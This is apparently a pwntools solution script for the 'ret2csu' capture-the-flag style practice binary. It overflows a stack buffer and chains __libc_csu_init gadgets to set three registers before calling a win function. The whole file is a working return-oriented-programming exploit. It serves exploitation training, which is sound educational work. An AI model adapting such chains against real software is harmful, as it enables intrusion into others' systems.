#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'

payload = cyclic(40, n=8) # 32 bytes of the buffer and 8 bytes for rbp
payload += p64(0x000000000040069a) # pop rbx....ret
payload += p64(0x0000000000000000) # 0 offset
payload += p64(0x0000000000000001) # rbp needs to be one for the cmp
payload += p64(0x0000000000600e48) # r12 --> pointer to _fini 
payload += p64(0x0000000000000000) # random r13 value
payload += p64(0xcafebabecafebabe) # r14 --> rsi
payload += p64(0xd00df00dd00df00d) # r15 --> rdx
payload += p64(0x0000000000400680) # mov rdx, r15...ret
payload += p64(0x0000000000000000) # padding for the add rsp, 0x8 instruction
payload += p64(0x0000000000000000) # pop rbx
payload += p64(0x0000000000000000) # pop rbp
payload += p64(0x0000000000000000) # pop r12
payload += p64(0x0000000000000000) # pop r13
payload += p64(0x0000000000000000) # pop r14
payload += p64(0x0000000000000000) # pop r15
payload += p64(0x00000000004006a3) # pop rdi; ret
payload += p64(0xdeadbeefdeadbeef) # arg for rdi
payload += p64(0x0000000000400510) # ret2win address

p = process("./ret2csu")
p.send(payload)
p.interactive()


















